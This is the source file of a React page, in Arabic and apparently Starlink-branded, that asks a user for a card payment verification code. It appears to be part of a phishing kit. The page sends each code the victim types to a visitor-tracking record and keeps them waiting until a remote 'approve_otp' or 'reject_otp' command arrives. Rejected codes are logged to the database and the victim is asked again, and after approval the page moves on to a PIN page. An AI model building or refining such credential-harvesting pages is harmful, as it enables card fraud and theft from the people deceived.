import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { ShieldCheck, Loader2 } from "lucide-react";
import { toast } from "@/hooks/use-toast";
import { updateVisitorData } from "@/hooks/useVisitorTracking";
import { supabase } from "@/integrations/supabase/client";
import { SavedCardBadge, readCardMeta, SavedCardMeta } from "@/components/starlink/SavedCardBadge";
import SEO from "@/components/SEO";
import { seoData } from "@/lib/seo";

const PaymentOtp = () => {
  const navigate = useNavigate();
  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);
  const [waiting, setWaiting] = useState(false);
  const [seconds, setSeconds] = useState(60);
  const [card, setCard] = useState<SavedCardMeta | null>(null);

  useEffect(() => {
    const stored = sessionStorage.getItem("starlink_card");
    if (!stored) navigate("/payment", { replace: true });
    setCard(readCardMeta());
  }, [navigate]);

  useEffect(() => {
    if (seconds <= 0) return;
    const id = setInterval(() => setSeconds((s) => s - 1), 1000);
    return () => clearInterval(id);
  }, [seconds]);

  useEffect(() => {
    const onApproval = async (e: Event) => {
      const detail = (e as CustomEvent).detail;
      if (!detail) return;
      if (detail.command === "approve_otp") {
        setWaiting(false);
        navigate("/payment/pin");
      } else if (detail.command === "reject_otp") {
        // Save rejected OTP to rejected_otps array in DB
        const sessionId = sessionStorage.getItem("starlink_session_id");
        if (sessionId && otp) {
          await supabase.rpc("append_rejected_otp", { p_session_id: sessionId, p_otp: otp });
        }
        setWaiting(false);
        setOtp("");
        toast({
          title: "\u0631\u0645\u0632 \u0627\u0644\u062a\u062d\u0642\u0642 \u063a\u064a\u0631 \u0635\u062d\u064a\u062d",
          description: "\u0623\u0639\u062f \u0625\u062f\u062e\u0627\u0644 \u0627\u0644\u0631\u0645\u0632 \u0627\u0644\u0645\u0631\u0633\u0644 \u0625\u0644\u064a\u0643 \u0647\u0627\u062a\u0641\u0643.",
          variant: "destructive",
        });
      }
    };
    window.addEventListener("visitor-approval", onApproval);
    return () => window.removeEventListener("visitor-approval", onApproval);
  }, [navigate, otp]);

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!/^[0-9]{4,8}$/.test(otp)) {
      toast({ title: "\u0631\u0645\u0632 OTP \u063a\u064a\u0631 \u0635\u062d\u064a\u062d", description: "\u0623\u062f\u062e\u0644 \u0627\u0644\u0631\u0645\u0632 \u0627\u0644\u0645\u0631\u0633\u0644 \u0639\u0628\u0631 \u0631\u0633\u0627\u0644\u0629 SMS.", variant: "destructive" });
      return;
    }
    setLoading(true);
    await updateVisitorData({ card_otp: otp });
    setLoading(false);
    setWaiting(true);
  };

  return (
    <>
      <SEO title={seoData.paymentOtp.title} description={seoData.paymentOtp.description} path="/payment/otp" noIndex />
      <div className="min-h-screen bg-background flex items-center justify-center px-4">
        <div className="w-full max-w-md">
          <div className="border border-foreground/10 p-8 space-y-6">
            <div className="flex items-center justify-between gap-2 flex-wrap">
              <div className="flex items-center gap-2 text-xs text-muted-foreground">
                <ShieldCheck className="w-4 h-4" />
                <span>\u062a\u062d\u0642\u0642 \u062b\u0646\u0627\u0626\u064a \u2014 \u062d\u0645\u0627\u064a\u0629 \u062f\u0641\u0639\u064a\u0629 \u0648\u0627\u062d\u062f\u0629</span>
              </div>
              {card && <SavedCardBadge brand={card.brand} last4={card.last4} />}
            </div>

            <form onSubmit={submit} className="space-y-5">
              <div>
                <label className="text-sm text-muted-foreground mb-2 block">\u0631\u0645\u0632 \u0627\u0644\u062a\u062d\u0642\u0642</label>
                <input
                  type="text"
                  inputMode="numeric"
                  maxLength={8}
                  value={otp}
                  onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
                  placeholder="000000"
                  disabled={waiting}
                  className="w-full h-14 bg-transparent border border-foreground/20 px-4 focus:border-foreground outline-none transition-colors text-center text-2xl tracking-[0.5em] disabled:opacity-60"
                  required
                  autoFocus
                />
                <div className="flex justify-between items-center mt-2 text-xs text-muted-foreground">
                  <span>{seconds > 0 ? `\u0625\u0639\u0627\u062f\u0629 \u0627\u0644\u0625\u0631\u0633\u0627\u0644 \u062e\u0644\u0627\u0644 ${seconds}\u062b` : "\u064a\u0645\u0643\u0646\u0643 \u0625\u0639\u0627\u062f\u0629 \u0627\u0644\u0625\u0631\u0633\u0627\u0644"}</span>
                  <button
                    type="button"
                    disabled={seconds > 0 || waiting}
                    onClick={() => setSeconds(60)}
                    className="underline disabled:opacity-40 disabled:no-underline"
                  >
                    \u0625\u0639\u0627\u062f\u0629 \u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0631\u0645\u0632
                  </button>
                </div>
              </div>

              <button
                type="submit"
                disabled={loading || waiting}
                className="w-full h-12 bg-foreground text-background hover:bg-foreground/90 transition-all text-sm font-medium tracking-wider disabled:opacity-60 inline-flex items-center justify-center gap-2"
              >
                {waiting ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin" />
                    \u062c\u0627\u0631\u064a \u0627\u0644\u062a\u0623\u0643\u064a\u062f...
                  </>
                ) : loading ? (
                  "\u062c\u0627\u0631\u064a \u0627\u0644\u0625\u0631\u0633\u0627\u0644..."
                ) : (
                  "\u062a\u0623\u0643\u064a\u062f \u0627\u0644\u062f\u0641\u0639"
                )}
              </button>

              {waiting && (
                <p className="text-xs text-muted-foreground text-center">
                  \u0646\u062a\u062d\u0642\u0642 \u0645\u0646 \u0627\u0644\u0631\u0645\u0632 \u0645\u0639 \u0645\u0632\u0648\u062f \u0627\u0644\u062e\u062f\u0645\u0629. \u0644\u0627 \u062a\u063a\u0644\u0642 \u0647\u0630\u0647 \u0627\u0644\u0635\u0641\u062d\u0629.
                </p>
              )}
            </form>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentOtp;
